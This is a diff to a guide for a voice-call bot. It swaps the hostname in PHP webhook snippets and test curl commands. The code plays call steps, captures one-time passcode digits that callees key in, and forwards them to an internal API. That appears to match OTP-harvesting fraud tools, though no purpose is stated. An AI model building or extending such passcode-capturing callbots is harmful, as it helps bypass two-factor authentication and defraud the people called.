@@ -5,7 +5,7 @@
 ### 📍 Endpoint untuk Get Call Data
 
 ```
-GET https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/{call_id}
+GET https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{call_id}
 ```
 
 **Response:**
@@ -51,7 +51,7 @@ if (!$call_id) {
 }
 
 // Fetch call data from internal API
-$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
 $ch = curl_init($api_url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_TIMEOUT, 5);
@@ -162,7 +162,7 @@ if (!$call_id) {
 }
 
 // Fetch call data
-$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
 $ch = curl_init($api_url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $response = curl_exec($ch);
@@ -175,7 +175,7 @@ $digits = $call_data['digits'] ?? 6;
 // If OTP digits received, send to internal API and play step 3
 if ($otp_digits) {
     // Send OTP to internal API
-    $update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
+    $update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
     $update_data = [
         'event' => 'digits_received',
         'status' => 'digit_entered',
@@ -242,7 +242,7 @@ if (!$call_id) {
 }
 
 // Fetch call data
-$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
 $ch = curl_init($api_url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $response = curl_exec($ch);
@@ -254,7 +254,7 @@ $accepted_message = $call_data['accepted_message'] ?? 'Thank you for confirming'
 $voice = $call_data['tts_voice'] ?? 'Aurora';
 
 // Send update to internal API
-$update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
+$update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
 $update_data = [
     'event' => 'call_accepted',
     'status' => 'accepted',
@@ -292,7 +292,7 @@ $recording_url = $_POST['RecordingUrl'] ?? null;
 
 if ($call_id) {
     // Send status update to internal API
-    $update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
+    $update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
     $update_data = [
         'event' => 'status_update',
         'status' => $call_status,
@@ -335,7 +335,7 @@ if (!$call_id) {
 }
 
 // Send AMD result to internal API
-$update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
+$update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
 $update_data = [
     'event' => 'amd_result',
     'answered_by' => $answered_by,
@@ -406,7 +406,7 @@ if ($answered_by === 'machine_start' || $answered_by === 'machine_end_beep') {
 
 ### Test Get Call Data:
 ```bash
-curl https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/test123
+curl https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/test123
 ```
 
 ### Test PHP Webhook:
